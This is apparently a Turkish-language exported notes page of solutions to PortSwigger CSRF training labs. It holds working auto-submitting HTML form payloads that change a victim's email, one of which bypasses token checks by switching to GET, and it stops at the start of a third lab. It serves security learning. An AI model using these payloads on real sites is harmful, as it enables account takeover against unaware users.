<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CSRF </title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
}

.simple-table-header {
	background: rgb(247, 246, 243);
	color: black;
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(145, 145, 142, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(187, 132, 108, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(215, 129, 58, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 148, 51, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(108, 155, 125, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(91, 151, 189, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(167, 130, 195, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(205, 116, 159, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(225, 111, 100, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(145, 145, 142, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(187, 132, 108, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(215, 129, 58, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 148, 51, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(108, 155, 125, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(91, 151, 189, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(167, 130, 195, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(205, 116, 159, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(225, 111, 100, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="e3afc7a6-f635-4fbe-97cd-fddf987364d3" class="page sans"><header><h1 class="page-title">CSRF </h1></header><div class="page-body"><p id="8dafedaf-749f-4bea-a701-da573784b723" class="">
</p><p id="822067cb-a914-4512-8193-1ea7cf6a8f78" class="">
</p><h1 id="fb808a9f-974e-4fb1-9ac1-e7a9e37074b9" class=""><mark class="highlight-orange">PORTSWIGGER CSRF LAB Çözümleri</mark></h1><p id="f6e061a1-04f4-435b-91a1-7d100b17d8a8" class="">
</p><p id="df00a3a2-ad2f-41b9-ad2a-9ec422499ed0" class="">
</p><p id="29c3797f-57cc-485e-8383-c4d34f8ed3a9" class="">
</p><h2 id="0e5befa5-ff9d-4d1f-9450-119a5318eb8b" class="">Kısaca CSRF ( Cross Site Request Forgery ) Nedir ;</h2><p id="8532e59f-79b0-49b5-83dc-85d5c42c505f" class="">
</p><p id="94676c38-b312-4da0-8d72-fa08d4ed124d" class="">Siteler arası istek sahteciliği( CSRF ) , bu istek sahteciliği Same Origin olma durumundan kaynaklanıyor.</p><p id="5fb6e42f-4dd3-4195-8308-42d6dda8370a" class="">Same origin ;</p><ul id="9093b3d1-beca-4554-ab98-8e4be659d66e" class="bulleted-list"><li style="list-style-type:disc">Domain</li></ul><ul id="5c0dc2e9-d7a9-4f1a-abbb-6978d9ed0c98" class="bulleted-list"><li style="list-style-type:disc">Port</li></ul><ul id="d7917a96-21b1-42ed-9121-3d0517442825" class="bulleted-list"><li style="list-style-type:disc">Protocol</li></ul><p id="03495cad-13f2-4aa0-85e4-85469b1a1894" class="">3 özelliğin  aynı olması durumunda , yapılan http isteği cookie ekleme algoritmasının match olmasını sağladığı için ali.com&#x27;da iken veli.com&#x27;a authenticated durumda istek yapabilmeye olarak sağlar.</p><p id="200395e1-c9f8-44a7-979e-6f3634340636" class="">
</p><p id="6a8edf05-5a4e-4a7c-9ac3-249f9a95e66e" class="">
</p><p id="7b86e64b-c364-4384-a71b-1c2037fccb14" class="">
</p><p id="b2059584-3835-4c4b-9686-431bdaf6dff6" class="">
</p><h1 id="78746b63-95ea-42c8-8b5c-ab2a74f32b0f" class=""><mark class="highlight-purple">1.)</mark> <mark class="highlight-purple">CSRF vulnerability with no defenses</mark></h1><p id="a5928e44-5cab-47a3-9fad-a4636f30528a" class="">
</p><p id="92cb1bbf-8ace-4021-a340-c51cda8f7aa5" class="">
</p><p id="394a7531-a04a-4c5a-a18a-82bd08abadf0" class="">
</p><h3 id="e90a957d-1c25-44b2-9d85-b48a9b7f7c7c" class=""><mark class="highlight-teal">Bu lab&#x27;da CRSF zafiyetine karşı HİÇBİR önlem alınMAma durumu ;</mark></h3><p id="103a7031-2fcc-47c9-92f5-d1695cb778da" class="">
</p><p id="e96796ec-a352-4d11-af71-9a412043afe9" class="">
</p><p id="465e7822-da95-4bf1-ac5b-a35c1b3d296a" class="">
</p><p id="02e5ea15-0cf5-4873-b1fb-8ee0c80ac1ea" class="">Kurbanın mail adresini  , saldırganın istediği mail adresi ile değiştiren bir html sayfası yaratacağız ve onu server a upload edeceğiz (saldırganın serverı ) , kurban bu sayfaya geldiğinde (saldırganın server’ında koşan email changing payloadı içeren html sayfası ) , kendi mail adresini değiştiren zararlı bir sayfaya ( bu bir linke tıklama ile olabilir ) gidip mail adresinin , saldırganın istediği email adresine değiştirilmesini sağlayacak.</p><p id="64aff845-3856-4db8-9a29-a84c50247dc1" class="">Yani kısaca email changing işleminde kısmında CSRF var.</p><p id="0f08cc32-2b2e-41ea-b21e-45bf4521852f" class="">
</p><p id="94579d18-561a-4a09-9560-486c898e3c3b" class="">CSRF&#x27;in temelinde kurban , zararlı olduğunu bilmeyen ve görünmeyen bir http isteği yapar , ve bu http isteği cookie ekleme algoritması ile match  olan , kurbanın görmediği ama arka planda  onun cookileri&#x27;ni kullanarak yapılan bir http isteği olur.</p><p id="986b714d-1b1d-409c-8cb0-90cb7966c084" class="">
</p><p id="51dc66f3-92c7-4930-bcda-3a56b4760ee8" class="">
</p><p id="3de51028-c5a4-43b5-86ea-b2692ad29e49" class="">
</p><h2 id="68b99046-513d-448e-9247-e638ade060e1" class="">Portswigger’ın bu labındaki Front-End source code:</h2><pre id="924ba41b-0c49-467b-8b99-ef8b8f1c3f52" class="code"><code>&lt;form class=&quot;login-form&quot; name=&quot;change-email-form&quot; 
     action=&quot;/my-account/change-email&quot; method=&quot;POST&quot;&gt;

&lt;label&gt;Email&lt;/label&gt;

&lt;input required type=&quot;email&quot;  name=&quot;email&quot;    value=&quot;&quot;&gt;

&lt;button class=&#x27;button&#x27; type=&#x27;submit&#x27;&gt; Update email &lt;/button&gt;


&lt;/form&gt;</code></pre><p id="1c2fffa1-28af-49e6-add9-b3cac3394dc3" class="">
</p><p id="1f6ff6b0-188b-41e4-be06-35d68bb54f4d" class="">
</p><p id="5fd09e38-583f-4f16-9b36-c94994609cfb" class="">
</p><h2 id="63be381f-ab87-4258-a22a-dd58ff2486e4" class="">Bu bağlamdaki payload ;</h2><pre id="1300fffc-46e7-4dd4-a4d6-3718dcdd7cf0" class="code"><code>&lt;form  action=&quot;https://lab_domain/my-account/change-email&quot; method=&quot;POST&quot;&gt;
&lt;input  type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;saldırganın_istediği_mail_adresi@bu&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre><p id="8697c9bf-b1b7-4fa9-a8fc-d5264fff2595" class="">
</p><p id="87b8d480-1075-41f2-ac4f-fa15ba559a44" class="">
</p><p id="925c6f44-3e6f-4544-83d1-fffe5a632708" class=""><strong><mark class="highlight-yellow">Kısacası , yukarıdaki payload (form) otomatik bir http isteği yapmaya olanak veriyor ; burdaki CSRF zafiyeti ise yukarıdaki http isteğini herhangi bir siteden (zararlı bir aktivite olduğu için zararlı bir site diyelim ) yapabilme durumudur.</mark></strong></p><p id="aa56b7db-2e87-47da-a895-fa56902a0336" class="">
</p><p id="8e35201c-a5cb-41b0-808f-2ea1f9d9a85c" class="">
</p><p id="139e49be-bf29-4851-9afa-c2ee08798e70" class="">
</p><p id="05861b57-6c06-460c-9d8d-49eb0fa6d4e6" class="">########################################################################</p><p id="3e49964f-1881-4d8c-8369-5285033bcc9c" class="">########################################################################</p><p id="f4eec9c6-1c14-4849-a5df-59ffcc09e200" class="">########################################################################</p><p id="aae19fc3-bdd9-451d-827d-438cbdaefac3" class="">
</p><p id="2133824c-ab3a-40b6-83dd-a44c4081fd81" class="">
</p><h1 id="b524a275-9829-4dcb-a08e-5018138d4185" class=""><mark class="highlight-purple">2.)  CSRF where token validation depends on request method</mark></h1><p id="4c450088-7a72-4a41-90a4-6645308e2b42" class="">
</p><p id="22638817-b397-4316-8106-a3a8133977bd" class=""><strong><mark class="highlight-teal">Bu lab&#x27;da CSRF zafiyetine karşı csrf token mekanizması konulmuş.</mark></strong>
</p><p id="52e6d5ec-7e0a-47dc-935d-d4ea8daecc15" class="">
<mark class="highlight-blue"><strong>csrf token mekanizması</strong></mark><mark class="highlight-blue"> ; </mark></p><p id="58d7639c-3ecc-4bc3-b67e-0d92262358e4" class="">Browserda cookieleri bulunan ve http isteği yapılan adresin , <strong><mark class="highlight-yellow">gerçekten o bilgisayarın sahibinin istediği ve attığı bir istek mi</mark></strong>  </p><p id="88c5ccac-4948-4eb2-af95-3379999648f6" class=""><strong><mark class="highlight-brown">yoksa </mark></strong></p><p id="78340ab0-aa4a-4b0e-b768-8f247eeb27d2" class=""><strong><mark class="highlight-orange">başkaları tarafından hazırlanan bir http isteğinin o bilgisayarın sahibine yaptırması sonucu atılan bir istek</mark></strong> <strong><mark class="highlight-orange">mi</mark></strong><mark class="highlight-orange"> </mark></p><p id="e5b4e74d-c5dd-495e-8fd7-e7826e37b8be" class="">sorusunu sormaya yarayan bir güvenlik mekanizmasıdır. </p><p id="3a6d94e3-2027-4f36-ad39-efe534e886c2" class="">
</p><p id="4412e675-b65c-400c-9641-922d858c6773" class="">
</p><p id="9f331fc1-ebec-4dd1-bf10-92fbf9db2ea6" class="">
</p><h2 id="bcbc9713-1447-4cbe-85ec-b4b5744f31b6" class="">Portswigger’ın bu labındaki Front-End source code:</h2><pre id="026be28a-d048-4298-a3d0-f0d159ec9938" class="code"><code>&lt;form class=&quot;login-form&quot; name=&quot;change-email-form&quot; 
action=&quot;/my-account/change-email&quot; method=&quot;POST&quot;&gt;

&lt;label&gt;Email&lt;/label&gt;
&lt;input required type=&quot;email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;
&lt;input required type=&quot;hidden&quot; 
   name=&quot;csrf&quot; value=&quot;gE7pEGo6kPtkYAbTzNhaht1z1pmqBAlo&quot;&gt;

&lt;button class=&#x27;button&#x27; type=&#x27;submit&#x27;&gt; Update email &lt;/button&gt;

&lt;/form&gt;</code></pre><p id="d9359730-4689-495f-a1f4-936095f5ef92" class="">
</p><p id="bc805300-5a73-4047-8850-a5be94070516" class="">
</p><p id="57e0f213-c0f9-4efb-a654-4c961da7b5bd" class="">
</p><p id="a41c96eb-1e69-4756-9f57-ad6ffeab0290" class=""><mark class="highlight-orange">Her login olduğunda farklı bir değer atanan csrf değeri , csrf token mekanizması var , bu sayede herhangi bir zaman diliminde yapılan kandırmaca http istekleri için bu </mark><strong><mark class="highlight-blue">csrf</mark></strong><mark class="highlight-blue"> </mark><mark class="highlight-blue"><strong>token değerinin önceden bilinmesi gerekiyor</strong></mark><mark class="highlight-blue"> </mark><mark class="highlight-orange">ve onu yapılan http isteğinde yanına eklemek gerekiyor ki http isteği çalışsın gibi bir önlem almışlar.</mark></p><p id="5710a169-f9e2-4bf3-a29d-5ba8746ecf3a" class="">
</p><p id="459e97ad-17ad-4b3a-b228-70840982796e" class="">
</p><p id="aba2e95a-abd2-4b0a-8851-8579cfd18659" class="">csrf token :</p><p id="60d77f7b-9533-4299-9dc2-e1827339c90a" class="">Login 1.   ⇒    gE7pEGo6kPtkYAbTzNhaht1z1pmqBAlo</p><p id="97049ee2-898b-47be-8541-35cc6e9c1994" class="">Login 2   ⇒    RxbbAKn0TgMf9tOwOGJePjSbOomB3zGt</p><p id="b91af37e-767a-4ce6-a658-414d96155bbd" class="">( csrf  token değeri her login&#x27;de değişiyor sabit değil )</p><p id="c22aef4a-d323-48d3-abff-2fad47abddc1" class="">
</p><h3 id="3377eb66-3e2a-4feb-baa1-bbb149e77e5c" class="">
<mark class="highlight-teal">csrf değerini değiştir yolla , istek reject edilecek mi , kontrol et !</mark></h3><p id="d421a582-6f12-4995-b481-f6c6a67ec1df" class="">
</p><p id="aa40bae4-d4e7-4ff7-a5aa-196e037504c6" class="">csrf değerini değiştirdiğinde istek reject ediliyor mu onu gözlemle ( Eğer yazılımcılar csrf token değerinin server tarafında önemi olmayan bir config yaptılar ise ; csrf token bypass    )</p><p id="2b64cde2-dfb5-49cb-8c34-4e629153a44c" class="">
</p><p id="b4f079e1-ddc0-416d-a0fd-ae55a8f6194c" class="">
</p><h3 id="4144412c-8f94-46d6-a016-f9468c5b44eb" class=""><mark class="highlight-teal">Bu challengedeki olay şu </mark>; </h3><p id="aceec97a-5a13-4b48-ad87-feef0731853b" class="">
csrf token değeri <strong><mark class="highlight-yellow">sadece</mark></strong> yapılan<mark class="highlight-yellow"><strong> POST isteğinde doğrulanıyor</strong></mark> ,<strong><mark class="highlight-red"> isteği GET e çevirince csrf token değeri server tarafında kontrol edilmiyor</mark></strong>  , doğrulanmıyor !</p><p id="a5dcbf62-53e6-44c3-873a-d7ef9e8b3325" class="">
</p><p id="8b325bba-8469-4a2e-badf-bce63441c302" class="">
</p><p id="8573c691-eb4b-4a9e-8301-6e057994cf66" class=""><strong><mark class="highlight-blue">method=&quot;GET&quot; yaptığımızda , csrf token değeri serverda doğrulanmıyor</mark></strong></p><p id="9513b77b-142e-4ebe-bfc1-caadd6341a60" class="">
</p><h2 id="ac8e5b22-16f1-4aec-be17-7b185aa2bc26" class="">Bu bağlamdaki payload ;</h2><pre id="57929406-208a-4223-99bc-a198151493d9" class="code"><code>&lt;form action=&quot;https://domain/my-account/change-email&quot; method=&quot;GET&quot;   &gt;
&lt;input  type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hackeramigo@normal-user.net&quot;&gt;
&lt;input  type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;ister_koy_ister_koyma_GET_icin_kontrol_edilmiyor&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre><p id="41f0f073-5258-496a-9689-326adde361d3" class="">
</p><p id="4928b80c-f7e0-4bfc-9d98-0eeec48c4326" class="">
</p><p id="b053ab88-1c75-4371-98f8-34340de70a0f" class="">########################################################################</p><p id="8946666b-89f3-425c-8790-0ca436a0678c" class="">########################################################################</p><p id="d8ba6d0b-82fc-48ab-b9ff-ff444c308fb4" class="">########################################################################</p><p id="92c61a6b-2756-4bf7-8070-e85da86b7cb1" class="">
</p><h1 id="e16b4d10-980b-4015-8d68-5d56d16f7cec" class=""><mark class="highlight-purple">3.) CSRF where token validation depends on token being present</mark></h1><p id="ce8ef463-da59-493e-9bb9-808c89276098" class="">
</p><p id="a9786202-f96a-4c76-8815-1e332b0f0c29" class="">
</p><h2 id="18b23c3d-46eb-45b4-bfb9-b7bfce024e5c" class="">Portswigger’ın bu labındaki Front-End source code:</h2><pre id="fa1cb873-6718-4d65-bfd7-fdc52911a632" class="code"><code>
&lt;form class=&quot;login-form&quot; name=&quot;change-email-form&quot; 
action=&quot;/my-account/change-email&quot; method=&quot;POST&quot;&gt;

&lt;label&gt;Email&lt;/label&gt;

&lt;input required type=&quot;email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;

&lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; 
       value=&quot;IAYszdHm6S6aho8wRl8ShYav1yEKaZTl&quot;&gt;

&lt;button class=&#x27;button&#x27; type=&#x27;submit&#x27;&gt; Update email &lt;/button&gt;

&lt;/form&gt;</code></pre><p id="87952b34-81b4-4134-bac2-6715681da620" class="">
</p><p id="aa8fe0f4-7f80-4470-bab4-f3cdb3111e39" class="">
</p><p id="30df3bf3-af0c-4bf2-be68-c81eb9bfa18d" class="">Burada da yine csrf token değeri  her login&#x27;de sürekli değişiyor.</p><p id="7d5b7324-fa80-4a46-9e23-d695298894e4" class="">
